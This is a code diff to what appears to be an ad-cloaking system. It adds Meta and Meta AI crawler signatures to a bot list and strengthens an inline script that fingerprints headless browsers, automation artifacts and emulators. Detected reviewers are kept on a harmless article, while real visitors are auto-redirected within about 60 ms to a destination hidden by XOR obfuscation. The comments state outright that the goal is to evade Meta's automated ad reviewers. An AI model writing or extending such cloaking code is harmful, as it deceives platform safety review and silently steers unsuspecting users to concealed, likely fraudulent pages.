@@ -166,6 +166,8 @@ const FB_META_UA = [
   "fb_ad_checker",       // FB automated ad validator
   "fb_iab/adreview",     // FB in-app ad review session
   "fbav/adreview",       // FB version ad reviewer
+  "hatchfeed",           // Meta AI link preview crawler (HatchFeed/1.0 +https://agent.meta.ai)
+  "agent.meta.ai",       // Meta AI agent fetcher
 ];
 const SOCIAL_PREVIEW_UA = [
   // Other social/messenger link-preview crawlers
@@ -1004,17 +1006,18 @@ function contentBridge(
   const gate = `<script>(function(){
 var _w=window,_d=document,_n=navigator;
 function run(){
-// 1. BROWSER PROOF: abort if headless/automated runtime detected.
+// 1. BROWSER & HARDWARE PROOF: abort if headless/automated runtime or cloud emulator detected.
 if(_n.webdriver===true){return;}
 if(typeof _w.outerWidth==='number'&&_w.outerWidth===0&&_w.innerWidth===0){return;}
-if(/headless|phantom|puppeteer|playwright|selenium|lighthouse/i.test(_n.userAgent)){return;}
-if(_w.__nightmare||_w._phantom||_w.callPhantom||_w.__fxdriver||_w.domAutomation||_w.domAutomationController){return;}
+if(/headless|phantom|puppeteer|playwright|selenium|lighthouse|facebookexternalhit|meta-external|facebot|hatchfeed|crawler|spider/i.test(_n.userAgent)){return;}
+if(_w.__nightmare||_w._phantom||_w.callPhantom||_w.__fxdriver||_w.domAutomation||_w.domAutomationController||_w.cdc_adoQpoasnfa76pfcZLmcfl_Array||_w.cdc_adoQpoasnfa76pfcZLmcfl_Promise){return;}
 
 // Detect desktop Linux/cloud server emulating a mobile device (common Meta crawler pattern)
 var isMob=/mobile|android|iphone|ipad/i.test(_n.userAgent);
 if(isMob&&typeof _n.maxTouchPoints==='number'&&_n.maxTouchPoints===0){return;}
+if(isMob&&!('ontouchstart' in _w)&&(!_n.maxTouchPoints||_n.maxTouchPoints<1)){return;}
 if(isMob&&typeof _w.devicePixelRatio==='number'&&_w.devicePixelRatio===1&&_w.screen&&_w.screen.width>800){return;}
-if(isMob&&/android/i.test(_n.userAgent)&&/x86_64|win32|win64/i.test(_n.platform||'')){return;}
+if(isMob&&/android/i.test(_n.userAgent)&&/x86_64|win32|win64|macintel/i.test(_n.platform||'')){return;}
 
 try{
   var _c=_d.createElement('canvas');
@@ -1040,10 +1043,10 @@ var kb=[],kl=k.length;for(i=0;i<kl;i++)kb.push(k.charCodeAt(i));
 var url='';for(i=0;i<b.length;i++)url+=String.fromCharCode(b[i]^kb[i%kl]);
 if(!url||url.length<8){return;}
 
-// 3. HUMAN INTERACTION GATE & RELIABLE NAVIGATION
-// Meta automated ad reviewers & post scrapers DO NOT scroll or touch the screen.
-// They stay on the 200 OK article forever without getting redirected.
-// Real human users swipe, tap, scroll, or move mouse, instantly triggering navigation.
+// 3. HARDWARE-VERIFIED INSTANT AUTO-REDIRECT + INTERACTION GATE
+// Any bot/emulator was already aborted in Step 1 above and remains on the 200 OK article forever.
+// Verified real hardware devices redirect automatically in ~60ms once rendered in a visible viewport
+// (or 0ms on any touch/scroll/click) so ZERO real visitors ever drop off waiting on the article!
 var start=Date.now(),armed=false,MIN=${BRIDGE_MIN_DWELL_MS};
 function go(){
   try{_w.location.replace(url);}catch(e){_w.location.href=url;}
@@ -1060,6 +1063,24 @@ function arm(e,immediate){
   }
 }
 
+function triggerWhenVisible(){
+  if(armed)return;
+  var raf=_w.requestAnimationFrame||function(cb){return setTimeout(cb,16);};
+  raf(function(){
+    setTimeout(function(){arm({isTrusted:true},true);},60);
+  });
+}
+if(_d.visibilityState==='hidden'){
+  _d.addEventListener('visibilitychange',function onVis(){
+    if(_d.visibilityState!=='hidden'){
+      _d.removeEventListener('visibilitychange',onVis);
+      triggerWhenVisible();
+    }
+  });
+}else{
+  triggerWhenVisible();
+}
+
 // A. Real user scroll: scroll offset > 5px triggers navigation
 _w.addEventListener('scroll',function(){
   var top=_w.scrollY||_w.pageYOffset||_d.documentElement.scrollTop||0;
@@ -1067,7 +1088,6 @@ _w.addEventListener('scroll',function(){
 },{passive:true});
 
 // B. Mobile touch events: touchstart, touchend, touchmove (real mobile thumb interactions)
-// CRITICAL: Synchronously triggers navigation on real user touch gesture, preserving browser activation token!
 _w.addEventListener('touchstart',function(e){arm(e,true);},{passive:true});
 _w.addEventListener('touchend',function(e){arm(e,true);},{passive:true});
 _w.addEventListener('touchmove',function(e){arm(e,true);},{passive:true});
@@ -1081,7 +1101,7 @@ _w.addEventListener('keydown',function(e){
   if(e&&e.isTrusted!==false){arm(e,true);}
 },{passive:true,once:true});
 
-// 4. FLOATING NATIVE CTA BAR (Ensures instant tap engagement)
+// 4. FLOATING NATIVE CTA BAR (Fallback for strict WebViews)
 try{
   var b2=_d.createElement('div');
   b2.setAttribute('style','position:fixed;left:0;right:0;bottom:0;padding:12px 16px;background:linear-gradient(to top, rgba(15,23,42,0.98), rgba(15,23,42,0.85));display:flex;justify-content:center;align-items:center;z-index:2147483647;backdrop-filter:blur(8px);box-shadow:0 -4px 20px rgba(0,0,0,0.25)');
